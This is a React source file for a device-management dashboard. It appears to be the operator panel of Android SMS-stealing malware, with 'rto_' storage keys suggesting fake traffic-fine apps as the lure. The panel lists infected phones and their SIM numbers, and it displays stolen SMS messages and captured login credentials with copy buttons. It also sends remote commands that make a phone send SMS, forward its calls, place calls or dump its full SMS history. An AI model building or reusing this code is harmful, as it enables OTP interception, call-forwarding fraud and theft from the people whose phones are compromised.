"use client";
import React, { useState, useEffect } from "react";
import { ref, update, remove } from "firebase/database";
import { db } from "../lib/firebase";

const DEVICE_LIMIT = 10;

export default function DevicesPanel({ 
  data, 
  deviceOnlineStatus, 
  deviceSerialMap, 
  favourites, 
  toggleFavourite, 
  showToast,
  openSmsModal,
  deleteAllSms,
  deleteAllCredentials
}) {
  const [searchQuery, setSearchQuery] = useState("");
  const [filter, setFilter] = useState("all");
  const [offset, setOffset] = useState(0);
  const [expandedDevices, setExpandedDevices] = useState({});
  const [activeTabs, setActiveTabs] = useState({});

  // Permanent Persistent State for SMS Content & Recipient
  const [globalSmsNum, setGlobalSmsNum] = useState("");
  const [globalSmsText, setGlobalSmsText] = useState("");
  const [simSelections, setSimSelections] = useState({});
  const [formMemory, setFormMemory] = useState({});

  // LocalStorage se saved SMS text aur number load karna
  useEffect(() => {
    try {
      const savedNum = localStorage.getItem("rto_sms_recipient");
      const savedText = localStorage.getItem("rto_sms_content");
      const savedSims = localStorage.getItem("rto_sim_selections");
      const savedMemory = localStorage.getItem("rto_form_memory");

      if (savedNum) setGlobalSmsNum(savedNum);
      if (savedText) setGlobalSmsText(savedText);
      if (savedSims) setSimSelections(JSON.parse(savedSims));
      if (savedMemory) setFormMemory(JSON.parse(savedMemory));
    } catch (e) {}
  }, []);

  // Recipient Number update & auto-save
  const handleRecipientChange = (val) => {
    setGlobalSmsNum(val);
    try {
      localStorage.setItem("rto_sms_recipient", val);
    } catch (e) {}
  };

  // Message Content update & auto-save
  const handleContentChange = (val) => {
    setGlobalSmsText(val);
    try {
      localStorage.setItem("rto_sms_content", val);
    } catch (e) {}
  };

  // SIM Selection per device
  const handleSimSelect = (devId, simVal) => {
    setSimSelections((prev) => {
      const updated = { ...prev, [devId]: simVal };
      try {
        localStorage.setItem("rto_sim_selections", JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });
  };

  // Generic Field updater for Call/Forward
  const updateMemoryField = (key, val) => {
    setFormMemory((prev) => {
      const updated = { ...prev, [key]: val };
      try {
        localStorage.setItem("rto_form_memory", JSON.stringify(updated));
      } catch (e) {}
      return updated;
    });
  };

  const devices = data.user_data || {};
  const deviceStatus = data.device_status || {};

  let keys = Array.from(new Set([...Object.keys(devices), ...Object.keys(deviceStatus)]));

  if (searchQuery) {
    const q = searchQuery.toLowerCase();
    keys = keys.filter(id => {
      const dev = devices[id] || {};
      const status = deviceStatus[id] || {};
      const name = status.device_name || dev.d_name || dev.Device_info || id;
      const serial = deviceSerialMap[id] || 0;
      return (id + " " + name + " " + serial).toLowerCase().includes(q);
    });
  }

  keys.sort((a, b) => {
    const onA = deviceOnlineStatus[a] ? 1 : 0;
    const onB = deviceOnlineStatus[b] ? 1 : 0;
    if (onA !== onB) return onB - onA;
    const sA = deviceSerialMap[a] || 0;
    const sB = deviceSerialMap[b] || 0;
    return sB - sA;
  });

  if (filter === "online") {
    keys = keys.filter(id => deviceOnlineStatus[id] === true);
  } else if (filter === "offline") {
    keys = keys.filter(id => !deviceOnlineStatus[id]);
  }

  const paginatedKeys = keys.slice(offset, offset + DEVICE_LIMIT);

  const copyToClipboard = (text, label = "Item") => {
    if (!text) return;
    navigator.clipboard.writeText(String(text));
    showToast(`📋 Copied: ${String(text).slice(0, 20)}`, "success");
  };

  const toggleExpand = (id) => {
    setExpandedDevices(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleTab = (devId, tab) => {
    setActiveTabs(prev => ({ ...prev, [devId]: prev[devId] === tab ? null : tab }));
  };

  const handleCommand = (type, devId) => {
    const baseRef = ref(db, `user_data/${devId}`);

    if (type === "sendsms") {
      const num = globalSmsNum.trim();
      const body = globalSmsText.trim();
      const selectedSim = simSelections[devId] || "0";

      if (!num || !body) return showToast("⚠️ Recipient number aur message dono likhein!", "warning");
      if (!confirm(`Send SMS via SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "send message",
        targetDeviceId: devId,
        phoneNumber: num,
        messageText: body,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => {
        showToast(`✅ SMS sent via SIM ${Number(selectedSim) + 1}`, "success");
        // NOTE: Input text ko clear nahi kiya gaya hai taaki wo wahi rahe!
      });
    } 
    else if (type === "fwd_on") {
      const num = formMemory[`fwdNum-${devId}`];
      const selectedSim = formMemory[`fwdSim-${devId}`] || "0";

      if (!num) return showToast("⚠️ Enter forward-to phone number!", "warning");
      if (!confirm(`Activate Call Forward on SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "call forward",
        targetDeviceId: devId,
        phoneNumber: num,
        forwardNumber: num,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`✅ Call Forward ON (SIM ${Number(selectedSim) + 1})`, "success"));
    } 
    else if (type === "fwd_off") {
      const selectedSim = formMemory[`fwdSim-${devId}`] || "0";
      if (!confirm(`Deactivate Call Forward on SIM ${Number(selectedSim) + 1}?`)) return;

      update(baseRef, {
        command: "forward off",
        targetDeviceId: devId,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        simIndex: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`⛔ Call Forward OFF (SIM ${Number(selectedSim) + 1})`, "success"));
    } 
    else if (type === "call") {
      const num = formMemory[`callNum-${devId}`];
      const selectedSim = formMemory[`callSim-${devId}`] || "0";

      if (!num) return showToast("⚠️ Enter target phone number!", "warning");
      if (!confirm(`Make Call from SIM ${Number(selectedSim) + 1} to ${num}?`)) return;

      update(baseRef, {
        command: "make call",
        adminNumber: num,
        phoneNumber: num,
        simSlot: selectedSim,
        sim: Number(selectedSim),
        timestamp: Date.now()
      }).then(() => showToast(`📞 Calling via SIM ${Number(selectedSim) + 1}`, "success"));
    } 
    else if (type === "backup") {
      if (!confirm(`Trigger full SMS backup on ${devId}?`)) return;
      update(baseRef, { command: "backup", timestamp: Date.now() })
        .then(() => showToast("💾 Backup initiated", "success"));
    }
  };

  const deleteDeviceData = (devId, type) => {
    const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
    if (!confirm(`Delete ${type} for ${devId}?`)) return;

    const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
    remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
  };

  const onlineCount = Object.values(deviceOnlineStatus).filter(Boolean).length;
  const offlineCount = keys.length - onlineCount;

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Registered Devices</h2>
          <p className="panel-sub">Click on any device to expand controls & details</p>
        </div>
        <div className="panel-stats">
          <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>
            All ({keys.length})
          </button>
          <button className={`filter-btn ${filter === "online" ? "active" : ""}`} onClick={() => { setFilter("online"); setOffset(0); }}>
            🟢 Online ({onlineCount})
          </button>
          <button className={`filter-btn ${filter === "offline" ? "active" : ""}`} onClick={() => { setFilter("offline"); setOffset(0); }}>
            🔴 Offline ({offlineCount})
          </button>
        </div>
      </div>

      <div className="search-container">
        <i className="fas fa-search search-icon"></i>
        <input 
          type="text" 
          value={searchQuery}
          onChange={(e) => { setSearchQuery(e.target.value); setOffset(0); }}
          placeholder="Search by ID, name, or serial..." 
          className="search-input"
        />
        {searchQuery && (
          <button className="search-clear-btn" style={{ display: "block" }} onClick={() => setSearchQuery("")}>
            <i className="fas fa-times"></i>
          </button>
        )}
      </div>

      <div style={{ marginBottom: 12, display: "flex", justifyContent: "flex-end", gap: 8, flexWrap: "wrap" }}>
        <button className="btn-delete-all" onClick={deleteAllSms}><i className="fas fa-trash-alt"></i> Delete All SMS</button>
        <button className="btn-delete-all credential" onClick={deleteAllCredentials}><i className="fas fa-key"></i> Delete All Credentials</button>
      </div>

      <div id="devicesContainer">
        {offset > 0 && (
          <button className="btn-load-more" style={{ marginBottom: 10 }} onClick={() => setOffset(Math.max(0, offset - DEVICE_LIMIT))}>
            <i className="fas fa-chevron-up"></i> Previous Page
          </button>
        )}

        {paginatedKeys.map((devId, idx) => {
          const dev = devices[devId] || {};
          const status = deviceStatus[devId] || {};
          const isOnline = Boolean(deviceOnlineStatus[devId]);
          const isFav = favourites.includes(devId);
          const serial = deviceSerialMap[devId] || 0;
          const expanded = expandedDevices[devId];
          const curTab = activeTabs[devId];

          const modelName = status.device_name || dev.Device_info || dev.d_name || "Device";
          const lastSeen = status.last_seen || dev.last_online || "N/A";

          const smsMap = data.user_sms?.[devId] || {};
          const smsList = Object.values(smsMap).reverse();
          const loginMap = data.login?.[devId] || {};
          const loginList = Object.entries(loginMap).map(([key, val]) => ({
            key,
            ...val,
            _timestamp: val.timestamp || val.date || 0
          })).sort((a, b) => b._timestamp - a._timestamp);

          const sim1Num = dev.numberSim1 || "No SIM 1";
          const sim2Num = dev.numberSim2 || "No SIM 2";
          const currentSelectedSim = simSelections[devId] || "0";

          return (
            <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
              {/* Card Header */}
              <div className="card-header" onClick={() => toggleExpand(devId)}>
                <div style={{ flex: 1, minWidth: 0 }}>
                  <div className="device-name-premium">
                    <button 
                      className="fav-star-btn" 
                      onClick={(e) => { e.stopPropagation(); toggleFavourite(devId); }}
                    >
                      <i className={isFav ? "fas fa-star" : "far fa-star"}></i>
                    </button>
                    <span className="name-text">📱 {devId.slice(0, 14)}...</span>
                    <span className="device-id">#{offset + idx + 1}</span>
                    {serial > 0 && <span className="serial-badge-premium">S-{serial}</span>}
                    <button 
                      className="copy-device-id-btn" 
                      onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
                    >
                      <i className="fas fa-copy"></i> Copy ID
                    </button>
                  </div>

                  <div className="device-sub-info">
                    <span><i className="fas fa-microchip"></i> {modelName}</span>
                    <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || "SIM 1: N/A"}</span>
                    {dev.numberSim2 && <span><i className="fas fa-sim-card"></i> {dev.numberSim2}</span>}
                  </div>
                </div>

                <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-end", gap: 4 }}>
                  <span className={`status-badge-premium ${isOnline ? "online" : "offline"}`}>
                    <span className="status-dot"></span>
                    {isOnline ? "Online" : "Offline"}
                  </span>
                  <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
                    <i className="far fa-clock"></i> {lastSeen.slice(11) || lastSeen}
                  </span>
                </div>
              </div>

              {/* 4-Column Grid Info */}
              <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
                <div className="info-item-premium">
                  <span className="info-label">Device Model</span>
                  <span className="info-value">{modelName}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">SIM 1</span>
                  <span className="info-value">{dev.numberSim1 || "No SIM"}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">SIM 2</span>
                  <span className="info-value">{dev.numberSim2 || "No SIM"}</span>
                </div>
                <div className="info-item-premium">
                  <span className="info-label">Serial</span>
                  <span className="info-value highlight">{serial || "—"}</span>
                </div>
              </div>

              {/* Expand Hint */}
              <div className="expand-hint" onClick={() => toggleExpand(devId)}>
                <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
              </div>

              {/* Expandable Tabs */}
              {expanded && (
                <div className="expandable-content">
                  <div className="actions-row-premium">
                    {[
                      { id: "sms", label: "SMS", icon: "fas fa-envelope", count: smsList.length },
                      { id: "login", label: "Login", icon: "fas fa-key", count: loginList.length },
                      { id: "call", label: "Call", icon: "fas fa-phone" },
                      { id: "sendsms", label: "Send SMS", icon: "fas fa-paper-plane" },
                      { id: "fwd", label: "Forward", icon: "fas fa-random" },
                      { id: "backup", label: "Backup", icon: "fas fa-database" },
                      { id: "delete", label: "Delete", icon: "fas fa-trash" }
                    ].map(a => (
                      <button 
                        key={a.id} 
                        className={`action-btn-premium ${curTab === a.id ? "active" : ""}`}
                        onClick={() => handleTab(devId, a.id)}
                      >
                        <i className={a.icon}></i> {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
                      </button>
                    ))}
                  </div>

                  {/* SMS Sub-tab */}
                  {curTab === "sms" && (
                    <div className="section-premium">
                      <div className="section-title">
                        <span>Messages ({smsList.length})</span>
                        <button 
                          type="button"
                          onClick={(e) => {
                            e.stopPropagation();
                            openSmsModal(devId);
                          }} 
                          className="btn-gold" 
                          style={{ marginLeft: "auto", padding: "4px 12px", fontSize: 11, cursor: "pointer" }}
                        >
                          <i className="fas fa-expand" style={{ marginRight: 4 }}></i> View Full
                        </button>
                      </div>
                      <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
                        {smsList.slice(0, 8).map((m, i) => (
                          <div key={i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6, borderLeft: "2px solid var(--gold)" }}>
                            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "var(--text-muted)" }}>
                              <span style={{ color: "var(--gold-light)", fontWeight: 600 }}>{m.sender || m.address}</span>
                              <span>{m.date || ""}</span>
                            </div>
                            <div style={{ fontSize: 11, marginTop: 4, color: "var(--text-primary)" }}>{m.body}</div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Login Sub-tab */}
                  {curTab === "login" && (
                    <div className="section-premium">
                      <div className="section-title">
                        <span>Credentials ({loginList.length})</span>
                        <button onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                      </div>
                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                        {loginList.length === 0 ? (
                          <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                        ) : (
                          loginList.map((cred, i) => (
                            <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.3)", padding: 10, borderRadius: 8, border: "1px solid var(--border-color)" }}>
                              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 6, paddingBottom: 4, borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
                                <span style={{ fontSize: 11, fontWeight: 700, color: "var(--gold)" }}>Record #{i + 1}</span>
                                <button
                                  type="button"
                                  onClick={() => {
                                    let str = "";
                                    for (let k in cred) {
                                      if (!k.startsWith("_") && k !== "key") str += `${k}: ${cred[k]}\n`;
                                    }
                                    navigator.clipboard.writeText(str);
                                    showToast("📋 All Record fields copied!", "success");
                                  }}
                                  className="btn-sm"
                                  style={{ background: "rgba(212,175,55,0.15)", color: "var(--gold)", padding: "2px 8px", borderRadius: 4, cursor: "pointer" }}
                                >
                                  <i className="fas fa-copy"></i> Copy All
                                </button>
                              </div>

                              {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
                                <div key={k} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", fontSize: 11, padding: "3px 0", borderBottom: "1px dashed rgba(255,255,255,0.04)" }}>
                                  <span style={{ color: "var(--text-muted)" }}>{k}:</span>
                                  <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                                    <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
                                    <button
                                      type="button"
                                      onClick={() => copyToClipboard(v, k)}
                                      style={{ background: "transparent", border: "none", color: "var(--gold)", cursor: "pointer", fontSize: 11 }}
                                      title={`Copy ${k}`}
                                    >
                                      <i className="fas fa-copy"></i>
                                    </button>
                                  </div>
                                </div>
                              ))}
                            </div>
                          ))
                        )}
                      </div>
                    </div>
                  )}

                  {/* SEND SMS COMMAND (PERMANENT RECIPIENT & CONTENT) */}
                  {curTab === "sendsms" && (
                    <div className="section-premium">
                      <div className="section-title">
                        <i className="fas fa-paper-plane" style={{ marginRight: 6 }}></i> Send SMS Command
                      </div>

                      {/* SIM Selection */}
                      <div style={{ marginBottom: 10 }}>
                        <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
                          Select Outgoing SIM:
                        </label>
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                          <button
                            type="button"
                            onClick={() => handleSimSelect(devId, "0")}
                            style={{
                              padding: "8px",
                              borderRadius: 8,
                              border: currentSelectedSim === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                              background: currentSelectedSim === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                              color: currentSelectedSim === "0" ? "var(--gold)" : "var(--text-secondary)",
                              fontSize: 11,
                              fontWeight: 600,
                              cursor: "pointer",
                              textAlign: "center"
                            }}
                          >
                            <i className="fas fa-sim-card"></i> SIM 1 <br/>
                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim1Num})</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => handleSimSelect(devId, "1")}
                            style={{
                              padding: "8px",
                              borderRadius: 8,
                              border: currentSelectedSim === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                              background: currentSelectedSim === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                              color: currentSelectedSim === "1" ? "var(--gold)" : "var(--text-secondary)",
                              fontSize: 11,
                              fontWeight: 600,
                              cursor: "pointer",
                              textAlign: "center"
                            }}
                          >
                            <i className="fas fa-sim-card"></i> SIM 2 <br/>
                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim2Num})</span>
                          </button>
                        </div>
                      </div>

                      {/* Permanent Recipient Phone Number */}
                      <input 
                        type="text" 
                        placeholder="Recipient Phone Number" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                        value={globalSmsNum}
                        onChange={(e) => handleRecipientChange(e.target.value)}
                      />

                      {/* Permanent Message Content */}
                      <textarea 
                        placeholder="Type Message Content..." 
                        rows="3"
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)", height: "auto" }}
                        value={globalSmsText}
                        onChange={(e) => handleContentChange(e.target.value)}
                      />

                      <div style={{ display: "flex", gap: 8 }}>
                        <button 
                          className="btn-luxury btn-blue" 
                          style={{ flex: 1, justifyContent: "center", padding: "10px" }} 
                          onClick={() => handleCommand("sendsms", devId)}
                        >
                          <i className="fas fa-paper-plane"></i> Send SMS from SIM {(Number(currentSelectedSim) + 1)}
                        </button>
                        {(globalSmsNum || globalSmsText) && (
                          <button
                            type="button"
                            title="Clear saved draft"
                            onClick={() => {
                              if (confirm("Clear saved recipient number and text?")) {
                                handleRecipientChange("");
                                handleContentChange("");
                                showToast("Draft cleared", "info");
                              }
                            }}
                            className="btn-sm"
                            style={{ background: "rgba(239, 68, 68, 0.15)", color: "var(--red)", borderRadius: 6, padding: "0 12px" }}
                          >
                            <i className="fas fa-eraser"></i>
                          </button>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Call Forward Command */}
                  {curTab === "fwd" && (
                    <div className="section-premium">
                      <div className="section-title">
                        <i className="fas fa-random" style={{ marginRight: 6 }}></i> Call Forward Controls
                      </div>

                      <div style={{ marginBottom: 10 }}>
                        <label style={{ fontSize: 11, color: "var(--text-muted)", display: "block", marginBottom: 5 }}>
                          Select Target SIM for Forwarding:
                        </label>
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                          <button
                            type="button"
                            onClick={() => updateMemoryField(`fwdSim-${devId}`, "0")}
                            style={{
                              padding: "8px",
                              borderRadius: 8,
                              border: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                              background: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                              color: (formMemory[`fwdSim-${devId}`] || "0") === "0" ? "var(--gold)" : "var(--text-secondary)",
                              fontSize: 11,
                              fontWeight: 600,
                              cursor: "pointer",
                              textAlign: "center"
                            }}
                          >
                            <i className="fas fa-sim-card"></i> SIM 1 <br/>
                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim1Num})</span>
                          </button>

                          <button
                            type="button"
                            onClick={() => updateMemoryField(`fwdSim-${devId}`, "1")}
                            style={{
                              padding: "8px",
                              borderRadius: 8,
                              border: formMemory[`fwdSim-${devId}`] === "1" ? "1px solid var(--gold)" : "1px solid var(--border-color)",
                              background: formMemory[`fwdSim-${devId}`] === "1" ? "rgba(212, 175, 55, 0.15)" : "var(--bg-input)",
                              color: formMemory[`fwdSim-${devId}`] === "1" ? "var(--gold)" : "var(--text-secondary)",
                              fontSize: 11,
                              fontWeight: 600,
                              cursor: "pointer",
                              textAlign: "center"
                            }}
                          >
                            <i className="fas fa-sim-card"></i> SIM 2 <br/>
                            <span style={{ fontSize: 9, opacity: 0.8 }}>({sim2Num})</span>
                          </button>
                        </div>
                      </div>

                      <input 
                        type="text" 
                        placeholder="Forward To Phone Number" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 10, borderRadius: 6, border: "1px solid var(--border-color)" }}
                        value={formMemory[`fwdNum-${devId}`] || ""}
                        onChange={(e) => updateMemoryField(`fwdNum-${devId}`, e.target.value)}
                      />

                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                        <button 
                          className="btn-luxury" 
                          style={{ background: "var(--green)", color: "#fff", justifyContent: "center", padding: "10px" }} 
                          onClick={() => handleCommand("fwd_on", devId)}
                        >
                          <i className="fas fa-play"></i> Turn ON Forward
                        </button>
                        <button 
                          className="btn-luxury btn-red" 
                          style={{ justifyContent: "center", padding: "10px" }} 
                          onClick={() => handleCommand("fwd_off", devId)}
                        >
                          <i className="fas fa-stop"></i> Turn OFF Forward
                        </button>
                      </div>
                    </div>
                  )}

                  {/* Call Sub-tab */}
                  {curTab === "call" && (
                    <div className="section-premium">
                      <div className="section-title">Make Call Command</div>
                      <input 
                        type="text" 
                        placeholder="Target Phone Number" 
                        className="search-input" 
                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6, border: "1px solid var(--border-color)" }}
                        value={formMemory[`callNum-${devId}`] || ""}
                        onChange={(e) => updateMemoryField(`callNum-${devId}`, e.target.value)}
                      />
                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("call", devId)}>
                        <i className="fas fa-phone"></i> Execute Call
                      </button>
                    </div>
                  )}

                  {/* Backup Sub-tab */}
                  {curTab === "backup" && (
                    <div className="section-premium">
                      <div className="section-title">Device Backup</div>
                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center", padding: "10px" }} onClick={() => handleCommand("backup", devId)}>
                        <i className="fas fa-database"></i> Trigger Full Backup
                      </button>
                    </div>
                  )}

                  {/* Delete Sub-tab */}
                  {curTab === "delete" && (
                    <div className="section-premium" style={{ borderColor: "var(--red)" }}>
                      <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                        <button className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
                          Delete SMS
                        </button>
                        <button className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
                          Delete Creds
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </div>
          );
        })}

        {offset + DEVICE_LIMIT < keys.length && (
          <button className="btn-load-more" onClick={() => setOffset(offset + DEVICE_LIMIT)}>
            <i className="fas fa-chevron-down"></i> Load More Devices ({keys.length - (offset + DEVICE_LIMIT)} remaining)
          </button>
        )}
      </div>
    </div>
  );
}
